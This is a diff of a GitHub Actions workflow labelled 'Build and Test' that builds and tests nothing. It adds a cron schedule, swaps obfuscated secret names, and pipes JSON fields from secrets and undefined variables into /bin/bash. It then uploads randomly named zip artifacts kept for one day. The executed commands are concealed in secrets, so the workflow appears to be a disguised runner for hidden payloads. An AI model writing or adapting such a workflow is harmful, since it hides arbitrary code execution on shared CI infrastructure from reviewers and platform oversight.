@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '2 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,18 +18,17 @@ jobs:
           fetch-depth: 1
       - name: Execute
         env:
-          s5: ${{ secrets.s5 }}
+          ckwq6209: ${{ secrets.ckwq6209 }}
         run: |
-          printf '%s' "$s5" | jq -r .iqtf31 | /bin/bash
-          printf '%s' "$ssjqb71" | jq -r .e19731 | /bin/bash
-          printf '%s' "$by53" | jq -r .urmz5870 | /bin/bash
-          echo $qrls5040 | jq -r .jy84209 | /bin/bash
-          printf '%s' "$ge059" | jq -r .hmd515 | /bin/bash
+          printf '%s' "$ckwq6209" | jq -r .f9 | /bin/bash
+          printf '%s' "$p80" | jq -r .g1 | /bin/bash
+          printf '%s' "$p0" | jq -r .hd4 | /bin/bash
+          printf '%s' "$gudc4763" | jq -r .x07 | /bin/bash
 
       - name: Upload artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: gyMZMZnl
+          name: z1LbgbaQ
           path: "*.zip"
           retention-days: 1
